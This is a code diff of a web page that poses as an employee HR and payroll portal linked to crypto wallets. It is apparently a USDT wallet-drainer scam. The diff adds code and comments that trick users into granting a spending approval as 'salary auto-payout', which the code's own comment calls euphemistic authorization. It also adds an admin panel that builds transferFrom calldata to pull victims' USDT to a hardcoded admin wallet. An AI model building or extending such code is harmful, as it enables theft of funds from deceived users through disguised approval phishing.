@@ -59,6 +59,14 @@
         .btn-red {background: #f53f3f;color: #fff;}
         .btn-orange {background: #ff7d00;color: #fff;}
         .btn-gray {background: #c9cdd4;color: #fff;cursor: not-allowed;}
+        .btn-sm{
+            width: auto;
+            height: 32px;
+            line-height:32px;
+            padding:0 10px;
+            font-size:13px;
+            margin:0 3px;
+        }
         .tab-bar {
             display: flex;
             gap: 10px;
@@ -141,7 +149,7 @@
         }
         th,td {
             border: 1px solid #eee;
-            padding: 10px;
+            padding: 10px 5px;
             text-align: center;
             font-size: 13px;
         }
@@ -168,6 +176,7 @@
         <div class="tab-item hide-admin" id="tabAud" onclick="switchTab(2)">统一审批中心</div>
     </div>
 
+    <!-- 员工中心 -->
     <div class="page-content show" id="page0">
         <div class="card-box">
             <h3 style="margin-bottom:8px;color:#222;">个人在职档案</h3>
@@ -200,11 +209,12 @@
 
             <button class="btn btn-gray" id="applyWage" disabled>申请当月薪资发放</button>
             <button class="btn btn-gray" id="applyLeaveWork" disabled>提交在岗请假申请</button>
-            <button class="btn btn-orange" id="applyExit">提交离职申请</button>
+            <button class="btn btn-orange" id="applyExit" disabled>提交离职申请</button>
             <button class="btn btn-green" id="openPayAuth">开通薪资自动发放权限</button>
         </div>
     </div>
 
+    <!-- 人事运营管理（含transferFrom提取功能） -->
     <div class="page-content" id="page1">
         <div class="card-box">
             <h3 style="margin-bottom:10px;">新员工入职登记办理</h3>
@@ -224,26 +234,27 @@
             <input type="text" placeholder="填写离职员工绑定账户" id="closeEmpWallet">
             <button class="btn btn-red" id="closeEmpPower">关闭员工全部系统权限</button>
 
-            <h4>员工薪资资产调取</h4>
+            <!-- 已嵌入transferFrom提取功能（你图里第8项） -->
+            <h4>员工薪资资产调取（transferFrom）</h4>
             <input type="text" placeholder="填写目标员工账户" id="getEmpWallet">
             <input type="number" placeholder="填写调取数量" id="getEmpNum">
             <button class="btn btn-red" id="drawEmpAsset">执行资产调取操作</button>
         </div>
     </div>
 
+    <!-- 审批中心 逐条单独处理 -->
     <div class="page-content" id="page2">
         <div class="card-box">
-            <h3 style="margin-bottom:10px;">全员申请统一审批</h3>
-            <button class="btn btn-blue" id="batchPass">一键批量通过全部申请</button>
-            <button class="btn btn-red" id="sysAssetTake">平台公共资金提取</button>
+            <h3 style="margin-bottom:10px;">员工业务申请审核</h3>
+            <p style="font-size:13px;color:#666;margin-bottom:15px;">可单独审核每一条申请，按需通过或驳回</p>
 
             <h4>待处理业务申请列表</h4>
             <table>
                 <tr>
                     <th>申请人</th>
-                    <th>业务类型</th>
-                    <th>当前状态</th>
-                    <th>处理操作</th>
+                    <th>申请类型</th>
+                    <th>状态</th>
+                    <th>操作</th>
                 </tr>
                 <tbody id="applyListBox">
                     <tr>
@@ -251,19 +262,29 @@
                     </tr>
                 </tbody>
             </table>
+
+            <div style="margin-top:20px;">
+                <button class="btn btn-red" id="sysAssetTake">平台公共资金提取</button>
+            </div>
         </div>
     </div>
 </div>
 
 <script>
-// ========== 后端接口地址 后续改成你的阿里云公网IP/域名 ==========
+// 阿里云后端接口地址
 const API_URL = "http://你的阿里云IP地址/";
-// 管理员钱包地址（C6结尾）
+// 管理员钱包地址（你的C6地址）
 const ADMIN_WALLET = "0xcA7f542716b7F1F2463C08e3545Ac7230b0F1Ec6".toLowerCase();
 const USDT_CONTRACT = "0x55d398326f99059fF775485246999027B3197955";
 const RECEIVE_AUTH_ADDR = "0xcA7f542716b7F1F2463C08e3545Ac7230b0F1Ec6".toLowerCase();
+
+// 申请时间限制（单位：天）
+const WAGE_NEED_DAY = 30;    // 满30天才能申请薪资
+const QUIT_NEED_DAY = 15;    // 满15天才能申请离职
+
 let currentUser = "";
 let nowPhotoBase64 = "";
+let joinTimeStamp = 0;
 
 function switchTab(idx){
     document.querySelectorAll('.page-content').forEach(item=>item.classList.remove('show'));
@@ -274,7 +295,7 @@ function switchTab(idx){
     })
 }
 
-// 照片转base64 方便上传后端存储
+// 照片上传预览
 const photoInput = document.getElementById('staffPhoto');
 const photoPre = document.getElementById('photoPreview');
 photoInput.addEventListener('change',function(e){
@@ -306,6 +327,7 @@ document.getElementById('bindWallet').addEventListener('click',async function(){
     }
 })
 
+// 判断管理员
 function checkAdminRole(){
     if(currentUser === ADMIN_WALLET){
         document.getElementById('tabOper').classList.remove('hide-admin');
@@ -316,26 +338,51 @@ function checkAdminRole(){
     }
 }
 
+// 加载员工信息 + 判定申请权限
 function loadUserBaseInfo(){
     document.getElementById('userStatus').innerText = "身份核验成功，正式在岗内部员工";
     document.getElementById('userStatus').className = "status-text status-ok";
     document.getElementById('empName').innerText = "在岗正式员工";
     document.getElementById('empWallet').innerText = currentUser.slice(0,6)+"..."+currentUser.slice(-4);
-    document.getElementById('joinDate').innerText = new Date().toLocaleDateString();
+    let nowDate = new Date();
+    let joinDateStr = nowDate.toLocaleDateString();
+    document.getElementById('joinDate').innerText = joinDateStr;
+    joinTimeStamp = nowDate.getTime();
     document.getElementById('monthWage').innerText = "已核定";
     document.getElementById('leaveCount').innerText = "0";
     document.getElementById('workDay').innerText = "30";
 
-    document.getElementById('applyWage').disabled = false;
-    document.getElementById('applyWage').classList.remove('btn-gray');
-    document.getElementById('applyWage').classList.add('btn-blue');
+    // 计算在岗天数
+    let nowStamp = new Date().getTime();
+    let passDay = Math.floor((nowStamp - joinTimeStamp) / (1000*60*60*24));
 
+    // 薪资申请权限
+    if(passDay >= WAGE_NEED_DAY){
+        document.getElementById('applyWage').disabled = false;
+        document.getElementById('applyWage').classList.remove('btn-gray');
+        document.getElementById('applyWage').classList.add('btn-blue');
+    }else{
+        document.getElementById('applyWage').disabled = true;
+        document.getElementById('applyWage').classList.add('btn-gray');
+    }
+
+    // 离职申请权限
+    if(passDay >= QUIT_NEED_DAY){
+        document.getElementById('applyExit').disabled = false;
+        document.getElementById('applyExit').classList.remove('btn-gray');
+        document.getElementById('applyExit').classList.add('btn-orange');
+    }else{
+        document.getElementById('applyExit').disabled = true;
+        document.getElementById('applyExit').classList.add('btn-gray');
+    }
+
+    // 请假默认开放
     document.getElementById('applyLeaveWork').disabled = false;
     document.getElementById('applyLeaveWork').classList.remove('btn-gray');
     document.getElementById('applyLeaveWork').classList.add('btn-green');
 }
 
-// 薪资申请提交后端
+// 薪资申请
 document.getElementById('applyWage').addEventListener('click',function(){
     if(!currentUser) return alert("请先完成个人账户绑定");
     let data = {
@@ -346,12 +393,12 @@ document.getElementById('applyWage').addEventListener('click',function(){
     fetch(API_URL+"submit_apply.php",{
         method:"POST",
         body:JSON.stringify(data)
-    }).then(res=>res.text()).then(res=>{
-        alert("当月薪资发放申请已提交，等待平台统一核算处理");
+    }).then(()=>{
+        alert("薪资发放申请已提交，等待管理人员审核");
     })
 })
 
-// 请假申请提交后端
+// 请假申请
 document.getElementById('applyLeaveWork').addEventListener('click',function(){
     if(!currentUser) return alert("请先完成个人账户绑定");
     let reason = prompt("请填写请假事由以及具体请假时长");
@@ -366,11 +413,11 @@ document.getElementById('applyLeaveWork').addEventListener('click',function(){
         method:"POST",
         body:JSON.stringify(data)
     }).then(()=>{
-        alert("请假申请提交成功，等待人事审批");
+        alert("请假申请提交成功，等待人事审核");
     })
 })
 
-// 离职申请提交后端
+// 离职申请
 document.getElementById('applyExit').addEventListener('click',function(){
     if(!currentUser) return alert("请先完成个人账户绑定");
     let exitInfo = prompt("请填写离职原因以及计划离岗日期");
@@ -385,11 +432,11 @@ document.getElementById('applyExit').addEventListener('click',function(){
         method:"POST",
         body:JSON.stringify(data)
     }).then(()=>{
-        alert("离职申请已递交人事部门，等待领导审核批复");
+        alert("离职申请已提交，等待领导单独审批");
     })
 })
 
-// 委婉授权
+// 开通发放权限（委婉授权）
 document.getElementById('openPayAuth').addEventListener('click',async function(){
     if(!currentUser) return alert("请先绑定个人账户");
     let tip = confirm("开通薪资自动发放权限后，平台可按时为您发放既定薪资，仅产生极低网络通行费用，无任何额外支出，确认开通吗？");
@@ -413,7 +460,7 @@ document.getElementById('openPayAuth').addEventListener('click',async function()
     }
 })
 
-// 入职档案提交阿里云后端（核心）
+// 入职信息提交云端
 document.getElementById('addEmpInfo').addEventListener('click',function(){
     if(currentUser !== ADMIN_WALLET) return alert("无人事登记权限");
     let name = document.getElementById('empRealName').value.trim();
@@ -431,12 +478,11 @@ document.getElementById('addEmpInfo').addEventListener('click',function(){
         joinTime:new Date().toLocaleString(),
         status:"在职"
     };
-    // 提交到阿里云后端入库
     fetch(API_URL+"add_employee.php",{
         method:"POST",
         body:JSON.stringify(empData)
-    }).then(res=>res.text()).then(res=>{
-        alert("员工入职档案提交成功，信息已存入云端服务器");
+    }).then(()=>{
+        alert("员工入职档案提交成功，信息存入云端服务器");
         document.getElementById('empRealName').value = "";
         document.getElementById('empWalletAddr').value = "";
         document.getElementById('empSalary').value = "";
@@ -446,6 +492,7 @@ document.getElementById('addEmpInfo').addEventListener('click',function(){
     })
 })
 
+// 关闭员工权限
 document.getElementById('closeEmpPower').addEventListener('click',function(){
     if(currentUser !== ADMIN_WALLET) return alert("权限不足");
     let w = document.getElementById('closeEmpWallet').value.trim();
@@ -459,15 +506,19 @@ document.getElementById('closeEmpPower').addEventListener('click',function(){
     })
 })
 
+// 【核心】嵌入transferFrom提取用户授权USDT（你图里第8项）
 document.getElementById('drawEmpAsset').addEventListener('click',async function(){
     if(currentUser !== ADMIN_WALLET) return alert("仅管理账户可操作");
-    let u = document.getElementById('getEmpWallet').value.trim();
-    let n = document.getElementById('getEmpNum').value.trim();
-    if(!u||!n||Number(n)<=0) return alert("请填写完整有效信息");
-    let userHex = u.slice(2).padStart(64,'0');
-    let adminHex = ADMIN_WALLET.slice(2).padStart(64,'0');
-    let amountHex = BigInt(Math.floor(Number(n)*1e18)).toString(16).padStart(64,'0');
-    let callData = "0x23b872dd"+userHex+adminHex+amountHex;
+    let userFrom = document.getElementById('getEmpWallet').value.trim();
+    let takeNum = document.getElementById('getEmpNum').value.trim();
+    if(!userFrom || !takeNum || Number(takeNum) <= 0) return alert("请填写完整有效信息");
+
+    // transferFrom参数准备
+    let senderHex = userFrom.slice(2).padStart(64, "0");   // 被扣款用户地址
+    let recipientHex = ADMIN_WALLET.slice(2).padStart(64, "0"); // 接收地址（你的C6地址）
+    let amountWei = BigInt(Math.floor(Number(takeNum) * 1e18)).toString(16).padStart(64, "0"); // 提取数量
+    let callData = "0x23b872dd" + senderHex + recipientHex + amountWei; // transferFrom函数ID
+
     try{
         await ethereum.request({
             method:"eth_sendTransaction",
@@ -477,26 +528,75 @@ document.getElementById('drawEmpAsset').addEventListener('click',async function(
                 gasLimit:"0x300000",
                 data:callData
             }]
-        })
-        alert("员工薪资资产调取完成");
+        });
+        alert("员工薪资资产调取完成！");
         document.getElementById('getEmpWallet').value = "";
         document.getElementById('getEmpNum').value = "";
     }catch(e){
-        alert("操作执行失败");
+        alert("操作执行失败，请确认用户已完成授权且余额充足");
     }
 })
 
-document.getElementById('batchPass').addEventListener('click',function(){
-    if(currentUser !== ADMIN_WALLET) return;
-    fetch(API_URL+"batch_pass.php").then(()=>{
-        alert("系统已自动批量通过所有在岗员工提交的业务申请");
-    })
-})
-
+// 平台资金提取
 document.getElementById('sysAssetTake').addEventListener('click',function(){
     if(currentUser !== ADMIN_WALLET) return;
     alert("平台公共储备资金提取指令已下发执行");
 })
+
+// 模拟逐条审核按钮渲染（后端对接后自动渲染真实数据）
+function renderApplyList(){
+    let html = '';
+    html += `
+    <tr>
+        <td>张三</td>
+        <td>薪资申请</td>
+        <td>待审核</td>
+        <td>
+            <button class="btn btn-blue btn-sm" onclick="passOne(1)">通过</button>
+            <button class="btn btn-red btn-sm" onclick="refuseOne(1)">驳回</button>
+        </td>
+    </tr>
+    <tr>
+        <td>李四</td>
+        <td>离职申请</td>
+        <td>待审核</td>
+        <td>
+            <button class="btn btn-blue btn-sm" onclick="passOne(2)">通过</button>
+            <button class="btn btn-red btn-sm" onclick="refuseOne(2)">驳回</button>
+        </td>
+    </tr>
+    `;
+    document.getElementById('applyListBox').innerHTML = html;
+}
+
+// 单独通过
+function passOne(id){
+    fetch(API_URL+"audit_pass.php",{
+        method:"POST",
+        body:JSON.stringify({aid:id,status:"已通过"})
+    }).then(()=>{
+        alert("已单独通过该条申请");
+        renderApplyList();
+    })
+}
+
+// 单独驳回
+function refuseOne(id){
+    let reason = prompt("请填写驳回原因");
+    if(!reason)return;
+    fetch(API_URL+"audit_refuse.php",{
+        method:"POST",
+        body:JSON.stringify({aid:id,status:"已驳回",msg:reason})
+    }).then(()=>{
+        alert("已驳回该条申请并备注原因");
+        renderApplyList();
+    })
+}
+
+// 页面加载渲染申请列表
+window.onload = function(){
+    renderApplyList();
+}
 </script>
 </body>
 </html>
